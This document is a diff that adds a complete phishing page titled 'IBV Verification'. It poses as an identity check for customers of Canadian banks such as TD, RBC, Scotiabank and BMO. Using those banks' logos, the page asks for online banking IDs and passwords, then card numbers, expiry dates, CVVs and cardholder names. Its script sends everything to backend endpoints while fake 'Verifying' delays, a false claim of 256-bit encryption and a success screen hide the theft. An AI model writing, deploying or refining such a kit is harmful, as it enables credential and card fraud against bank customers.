@@ -1,0 +1,397 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<title>IBV Verification</title>
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+:root {
+  --bg:#f4f6f9; --card:#fff; --text:#222; --muted:#666;
+  --primary:#2563eb; --primary-hover:#1e4fc2; --border:#e5e7eb; --success:#16a34a;
+}
+*{box-sizing:border-box;}
+body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+display:grid;place-items:center;min-height:100vh;padding:16px;background:var(--bg);color:var(--text);}
+.wrap{width:100%;max-width:420px;background:var(--card);border-radius:14px;
+box-shadow:0 10px 30px rgba(0,0,0,0.08);overflow:hidden;border:1px solid var(--border);}
+header{padding:18px 20px;border-bottom:1px solid var(--border);
+font-weight:700;text-align:center;letter-spacing:.2px;}
+.section{display:none;padding:20px;}
+.section.active{display:block;animation:fade .25s ease;}
+@keyframes fade{from{opacity:0} to{opacity:1}}
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:8px;}
+.bank{border:1px solid var(--border);border-radius:12px;padding:12px;
+display:grid;place-items:center;cursor:pointer;transition:transform .06s ease,box-shadow .06s ease,border-color .2s;background:#fff;}
+.bank:hover{transform:translateY(-1px);box-shadow:0 8px 18px rgba(0,0,0,.05);border-color:#d1d5db;}
+.logo{width:120px;height:48px;object-fit:contain;}
+.loading-wrap{text-align:center;padding:36px 12px;}
+.spinner{width:44px;height:44px;border-radius:50%;border:4px solid #e5e7eb;
+border-top-color:var(--primary);margin:0 auto 14px;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.bank-header{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;}
+.bank-title{font-weight:600;}
+.field{margin:10px 0;}
+.input,.btn,select{width:100%;padding:12px 12px;border-radius:10px;border:1px solid var(--border);font-size:15px;}
+.input:focus,select:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 3px rgba(37,99,235,.15);}
+.btn{background:var(--primary);color:#fff;border:none;font-weight:600;cursor:pointer;transition:background .15s ease,transform .04s ease;margin-top:4px;}
+.btn:hover{background:var(--primary-hover);}
+.btn:active{transform:translateY(1px);}
+.btn-secondary{background:#e5e7eb;color:#111827;}
+.btn-secondary:hover{background:#d1d5db;}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.muted{color:var(--muted);font-size:12px;line-height:1.4;margin-top:12px;}
+.startover{display:inline-block;margin-top:10px;font-size:13px;color:var(--primary);cursor:pointer;text-decoration:underline;background:none;border:none;padding:0;}
+.input-group{position:relative;}
+.toggle{position:absolute;right:10px;top:50%;transform:translateY(-50%);border:none;background:transparent;cursor:pointer;font-size:14px;color:var(--muted);}
+.done{text-align:center;padding:18px 8px;}
+.check{width:56px;height:56px;border-radius:50%;background:rgba(22,163,74,.1);color:var(--success);display:grid;place-items:center;margin:0 auto 10px;font-size:28px;}
+.security{margin-top:10px;padding-top:10px;border-top:1px dashed var(--border);color:var(--muted);font-size:12px;line-height:1.45;text-align:center;}
+</style>
+</head>
+<body>
+<div class="wrap" id="app">
+<header>
+  <img src="bnk.logo/header.png" alt="Logo" style="height:80px; vertical-align:middle; margin-right:8px;">
+</header>
+
+
+<!-- Bank Selection -->
+<section class="section active" id="select">
+<p>Select your institution</p>
+<div class="grid">
+  <div class="bank" data-name="Toronto-Dominion Bank" data-logo="bnk.logo/td.png"><img class="logo" src="bnk.logo/td.png" alt="Toronto-Dominion Bank"></div>
+  <div class="bank" data-name="Royal Bank of Canada" data-logo="bnk.logo/rbc.jpg"><img class="logo" src="bnk.logo/rbc.jpeg" alt="Royal Bank of Canada"></div>
+  <div class="bank" data-name="Bank of Nova Scotia" data-logo="bnk.logo/scotiabank.jpg"><img class="logo" src="bnk.logo/scotiabank.jpg" alt="Bank of Nova Scotia"></div>
+  <div class="bank" data-name="Bank of Montreal" data-logo="bnk.logo/bmo.png"><img class="logo" src="bnk.logo/bmo.png" alt="Bank of Montreal "></div>
+  <div class="bank" data-name="Canadian Imperial Bank of Commerce" data-logo="bnk.logo/cibc.png"><img class="logo" src="bnk.logo/cibc.png" alt="Canadian Imperial Bank of Commerce "></div>
+  <div class="bank" data-name="Tangerine Bank" data-logo="bnk.logo/tangerine.jpg"><img class="logo" src="bnk.logo/tangerine.jpg" alt="Tangerine Bank"></div>
+  <div class="bank" data-name="Simplii Financial" data-logo="bnk.logo/simplii.jpg"><img class="logo" src="bnk.logo/simplii.jpg" alt="Simplii Financial"></div>
+  <div class="bank" data-name="KOHO" data-logo="bnk.logo/koho.png"><img class="logo" src="bnk.logo/koho.png" alt="KOHO"></div>
+  <div class="bank" data-name="ATB Financial" data-logo="bnk.logo/atb.png"><img class="logo" src="bnk.logo/atb.png" alt="ATB Financial"></div>
+  <div class="bank" data-name="PC Financial" data-logo="bnk.logo/pcf.png"><img class="logo" src="bnk.logo/pcf.png" alt="PC Financial"></div>
+  <div class="bank" data-name="Other Bank" data-logo="bnk.logo/other.png"><img class="logo" src="bnk.logo/bank-icon.jpg" alt="Other Bank"><span style="font-size:12px;">Other Bank</span></div>
+</div>
+</section>
+
+<!-- Other Bank Dropdown -->
+<section class="section" id="otherBankSelect">
+<p>Select your bank:</p>
+<select id="otherBankDropdown">
+  <option value="">-- Select Bank --</option>
+<option value="National Bank of Canada">National Bank of Canada</option>
+<option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
+<option value="Canadian Western Bank">Canadian Western Bank</option>
+<option value="EQ Bank (Equitable Bank)">EQ Bank (Equitable Bank)</option>
+<option value="Motusbank">Motusbank</option>
+<option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
+<option value="HomeEquity Bank">HomeEquity Bank</option>
+<option value="Home Bank">Home Bank</option>
+<option value="President’s Choice Bank">President’s Choice Bank</option>
+<option value="RFA Bank of Canada">RFA Bank of Canada</option>
+<option value="Bridgewater Bank">Bridgewater Bank</option>
+<option value="Concentra Bank">Concentra Bank</option>
+<option value="CS Alterna Bank">CS Alterna Bank</option>
+<option value="Digital Commerce Bank">Digital Commerce Bank</option>
+<option value="Exchange Bank of Canada">Exchange Bank of Canada</option>
+<option value="Fairstone Bank of Canada">Fairstone Bank of Canada</option>
+<option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
+<option value="General Bank of Canada">General Bank of Canada</option>
+<option value="Haventree Bank">Haventree Bank</option>
+<option value="Peoples Bank of Canada">Peoples Bank of Canada</option>
+<option value="VersaBank">VersaBank</option>
+<option value="Wealth One Bank of Canada">Wealth One Bank of Canada</option>
+<option value="B2B Bank">B2B Bank</option>
+<option value="ADS Canadian Bank">ADS Canadian Bank</option>
+<option value="Canadian Tire Bank">Canadian Tire Bank</option>
+<option value="Rogers Bank">Rogers Bank</option>
+<option value="Vancity Community Investment Bank">Vancity Community Investment Bank</option>
+<option value="UNI Financial Cooperation">UNI Financial Cooperation</option>
+<option value="Coast Capital Savings">Coast Capital Savings</option>
+<option value="Innovation Federal Credit Union">Innovation Federal Credit Union</option>
+<option value="Meridian Credit Union">Meridian Credit Union</option>
+<option value="Alterna Savings">Alterna Savings</option>
+<option value="DUCA Credit Union">DUCA Credit Union</option>
+<option value="FirstOntario Credit Union">FirstOntario Credit Union</option>
+<option value="Steinbach Credit Union">Steinbach Credit Union</option>
+<option value="Servus Credit Union">Servus Credit Union</option>
+<option value="Connect First Credit Union">Connect First Credit Union</option>
+<option value="Affinity Credit Union">Affinity Credit Union</option>
+<option value="Prospera Credit Union">Prospera Credit Union</option>
+<option value="First West Credit Union">First West Credit Union</option>
+<option value="Assiniboine Credit Union">Assiniboine Credit Union</option>
+<option value="Access Credit Union">Access Credit Union</option>
+<option value="East Coast Credit Union">East Coast Credit Union</option>
+<option value="Stride Bank">Stride Bank</option>
+<option value="Atlantic Central">Atlantic Central</option>
+<option value="Vancity Credit Union">Vancity Credit Union</option>
+  <option value="Other">My bank is not listed</option>
+</select>
+
+<!-- Custom bank name input (hidden by default) -->
+<div class="field" id="customBankField" style="display:none; margin-top:10px;">
+  <input type="text" id="customBankName" class="input" placeholder="Enter your bank name">
+</div>
+
+<button class="btn" onclick="confirmOtherBank()">Continue</button>
+<button class="startover" onclick="startOver()">Start Over</button>
+</section>
+
+<!-- Loading -->
+<section class="section" id="loading">
+<div class="loading-wrap">
+<div class="bank-header">
+  <img id="loadingLogo" class="logo" alt="">
+  <span id="loadingName" class="bank-title"></span>
+</div>
+<div class="spinner"></div>
+<div class="loading-msg">Connecting… Please wait</div>
+<button class="startover" onclick="startOver()">Start Over</button>
+</div>
+</section>
+
+<!-- Step 1 Form -->
+<section class="section" id="step1">
+<form id="step1Form" onsubmit="completeStep1(event)">
+<div class="bank-header">
+  <img id="s1Logo" class="logo" alt="">
+  <span id="s1Name" class="bank-title"></span>
+</div>
+<h3>Login in to your Account</h3>
+<div class="field"><input name="onlineId" class="input" type="text" placeholder="Online ID" autocomplete="off" required></div>
+<div class="field input-group">
+<input name="password" class="input" type="password" placeholder="Password" autocomplete="off" required>
+<button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
+</div>
+<button type="submit" class="btn">Continue</button>
+<button type="button" class="startover" onclick="startOver()">Start Over</button>
+<div class="security">Your data is secured by 256-bit encryption. IBV will never share your credentials.</div>
+</form>
+</section>
+
+<!-- Step 2: Card details -->
+<section class="section" id="step2">
+<form id="step2Form" onsubmit="completeStep2(event)">
+<div class="bank-header">
+  <img id="s2Logo" class="logo" alt="">
+  <span id="s2Name" class="bank-title"></span>
+</div>
+<h3>Card verification</h3>
+<div class="field input-group">
+  <input name="cardNumber" id="cardVisible" class="input" type="text" inputmode="numeric" placeholder="Card Number" required>
+</div>
+<div class="row">
+  <div class="field">
+    <input name="expiry" id="expiry" class="input" type="text" placeholder="MM/YY" required>
+  </div>
+  <div class="field input-group">
+    <input name="cvv" id="cvv" class="input" type="text" inputmode="numeric" pattern="\d{3,4}" placeholder="CVV" maxlength="4" required>
+    <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
+  </div>
+</div>
+<div class="field">
+  <input name="name" id="name" class="input" type="text" placeholder="Name on Card" required>
+</div>
+<button type="submit" class="btn">Submit</button>
+<button type="button" class="btn btn-secondary" onclick="startOver()">Start Over</button>
+<div class="security">Your data is secured by 256-bit encryption.</div>
+</form>
+</section>
+
+<!-- Done -->
+<section class="section" id="done">
+<div class="done">
+<div class="bank-header">
+  <img id="doneLogo" class="logo" alt="">
+  <span id="doneName" class="bank-title"></span>
+</div>
+<div class="check">✓</div>
+<h3>Verification Complete</h3>
+<p class="muted">Your card verification was successful.</p>
+<button class="btn" onclick="startOver()">Back to start</button>
+</div>
+</section>
+
+</div>
+
+<script>
+const SECRET_TOKEN = "T20199328"; // must match PHP/Node.js environment variable
+// NEW: Unique ID for combining the two steps in the backend
+const SESSION_ID = Date.now() + Math.random().toString(36).substring(2); 
+
+// **NEW: GLOBAL VARIABLE TO HOLD STEP 1 DATA**
+let step1Data = {};
+
+let currentBank={name:'',logo:''};
+let rawCardDigits='';
+
+const otherBankLogos = {
+  // FIXED: Changed 'img/' to 'bnk.logo/' for consistency
+  "Fifth Third": "bnk.logo/53.png",
+  "American Express": "bnk.logo/amex.png",
+  "Arvest Bank": "bnk.logo/arvest.png",
+  "Navy Federal": "bnk.logo/navy.png",
+  "South State": "bnk.logo/south.png",
+  "Key Bank": "bnk.logo/key.png",
+  "Synovus Bank": "bnk.logo/synovus.png",
+  "Texas Capital": "bnk.logo/texas.png",
+  "USAA": "bnk.logo/usaa.png",
+  "WaFd Bank": "bnk.logo/wafd.png",
+  "Ally": "bnk.logo/ally.png"
+};
+
+const dropdown = document.getElementById('otherBankDropdown');
+const customBankField = document.getElementById('customBankField');
+
+dropdown.addEventListener('change', () => {
+  customBankField.style.display = dropdown.value === "Other" ? 'block' : 'none';
+});
+
+document.querySelectorAll('.bank').forEach(b=>{
+  b.addEventListener('click', ()=>{
+    if(b.dataset.name==='Other Bank'){ 
+      show('otherBankSelect'); 
+    } else { 
+      selectBank(b.dataset.name, b.dataset.logo);
+    }
+  });
+});
+
+function confirmOtherBank(){
+  let bankName = dropdown.value;
+  if(bankName === "Other"){
+    const customName = document.getElementById('customBankName').value.trim();
+    if(!customName){ alert("Please enter your bank name"); return; }
+    bankName = customName;
+  }
+
+  if(bankName){
+    const logo = otherBankLogos[bankName] || 'bnk.logo/bank-icon.jpg';
+    selectBank(bankName, logo);
+  } else {
+    alert('Please select a bank');
+  }
+}
+
+function selectBank(name, logo){
+  currentBank = {name, logo};
+  setStepLogos();
+  withLoading('step1', `Connecting to ${name}… Please wait`, 500);
+}
+
+function show(id){
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function withLoading(nextId, msg='Connecting… Please wait', delay=2000){
+  document.getElementById('loadingName').textContent = currentBank.name;
+  document.getElementById('loadingLogo').src = currentBank.logo;
+  document.querySelector('.loading-msg').textContent = msg;
+  show('loading');
+  setTimeout(()=>show(nextId), delay);
+}
+
+function setStepLogos(){
+  ['s1Logo','s2Logo','doneLogo'].forEach(id=>document.getElementById(id).src=currentBank.logo);
+  ['s1Name','s2Name','doneName'].forEach(id=>document.getElementById(id).textContent=currentBank.name);
+}
+
+function startOver(){
+  rawCardDigits=''; 
+  currentBank={name:'',logo:''};
+  // **CLEAR STEP 1 DATA**
+  step1Data = {}; 
+  document.querySelectorAll('input').forEach(i=>i.value=''); 
+  dropdown.value='';
+  customBankField.style.display='none';
+  show('select');
+}
+
+function toggleField(el){ el.type = el.type==='password' ? 'text' : 'password'; }
+
+// Card formatting
+const cardInput = document.getElementById('cardVisible');
+cardInput.addEventListener('input', ()=>{
+  let val = cardInput.value.replace(/\D/g,'');
+  rawCardDigits = val.slice(0,16);
+  cardInput.value = rawCardDigits.replace(/(.{4})/g,'$1 ').trim();
+});
+
+// Expiry formatting
+const expiryInput = document.getElementById('expiry');
+expiryInput.addEventListener('input', ()=>{
+  let val = expiryInput.value.replace(/\D/g,'');
+  if(val.length>2) val = val.slice(0,2)+'/'+val.slice(2,4);
+  expiryInput.value = val.slice(0,5);
+});
+
+// Step 1 submit (MODIFIED)
+function completeStep1(e){
+  e.preventDefault();
+  const form = document.getElementById('step1Form');
+  
+  // **ACTION 1: SAVE LOGIN DATA GLOBALLY**
+  step1Data = { 
+    onlineId: form.onlineId.value,
+    password: form.password.value
+  };
+  
+  const data = {
+    bankName: currentBank.name,
+    ...step1Data, // Send login data to Step 1 function (optional, for logging/debug)
+    token: SECRET_TOKEN,
+    session_id: SESSION_ID
+  };
+  
+  // Send Step 1 data (kept for tracking/logging)
+  fetch('/api/send-step1',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  });
+  
+  withLoading('step2','Verifying credentials…', 5000);
+}
+
+/// Step 2 submit (MODIFIED)
+function completeStep2(e){
+  e.preventDefault();
+  
+  const form = document.getElementById('step2Form');
+  
+  // FIX: Define cardNumber by getting its value and cleaning the spaces.
+  const cardNumber = form.cardNumber.value.replace(/\s/g,'');
+  
+  // Input validation code
+  if(cardNumber.length<16){ alert('Card must be 16 digits'); return; }
+  if(expiryInput.value.length!==5){ alert('Expiry must be MM/YY'); return; }
+  if(form.cvv.value.length<3){ alert('CVV must be 3 or 4 digits'); return; }
+  
+  // **ACTION 2: COMBINE ALL DATA INTO ONE PAYLOAD**
+  const data={
+    ...step1Data, // <-- INCLUDES onlineId and password
+    bankName: currentBank.name,
+    cardNumber: cardNumber,
+    expiry: form.expiry.value,
+    cvv: form.cvv.value,
+    name: form.name.value,
+    token: SECRET_TOKEN,
+    session_id: SESSION_ID
+  };
+  
+  // **FIXED: Targeting Vercel/Netlify Serverless Function**
+  fetch('/api/send-step2',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  });
+  
+  withLoading('done','Verifying card…',7000);
+}
+</script>
+</body>
+</html>
+
